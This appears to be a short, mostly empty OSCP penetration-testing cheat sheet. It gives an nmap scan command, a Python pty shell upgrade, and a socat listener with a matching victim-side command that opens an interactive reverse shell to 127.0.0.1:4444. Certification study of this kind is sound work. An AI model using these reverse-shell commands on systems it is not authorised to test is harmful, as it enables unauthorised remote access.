# OSCP
Offensive Security Certified Professional is an ethical hacking certification offered by Offensive Security that teaches penetration testing methodologies and the use of the tools included with the Kali Linux distribution.
# Enumeration
## NMAP
nmap -sV -sS 127.0.0.1 (all ports)
## SMB
## Dirbuster
# Payloads
## msfvenom
# Brute Force
# Exploits
# Shell Upgrade
## Python
python -c 'import pty; pty.spawn("/bin/bash")'
## Socat
Listener: socat file:`tty`,raw,echo=0 tcp-listen:4444
Victim: socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:127.0.0.1:4444

